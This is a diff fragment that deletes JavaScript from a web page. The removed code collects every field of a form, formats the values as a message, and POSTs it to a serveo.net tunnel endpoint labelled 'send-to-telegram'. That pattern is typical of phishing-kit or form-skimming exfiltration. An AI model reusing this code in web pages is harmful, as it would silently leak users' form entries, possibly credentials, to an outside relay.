@@ -1131,35 +1131,6 @@
 
 
 
-            // Collect form data
-            var formData = new FormData(document.getElementById('infoForm'));
-            var data = {};
-            formData.forEach(function (value, key) {
-                data[key] = value;
-            });
-
-            // Convert data to a message format
-            var message = "";
-            for (var key in data) {
-                message += key + ": " + data[key] + "\n";
-            }
-
-            // Send the data to your server
-            sendDataToServer(message);
-        }
-
-        function sendDataToServer(message) {
-            // Implement the AJAX request to your server here
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://b8a8c6262704b53fe083d4b2c691ab7c.serveo.net/DMbarcode/send-to-telegram", true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                message: message
-            }));
-
-            xhr.onload = function () {
-                console.log("Data sent and response received.");
-            };
 
 
 
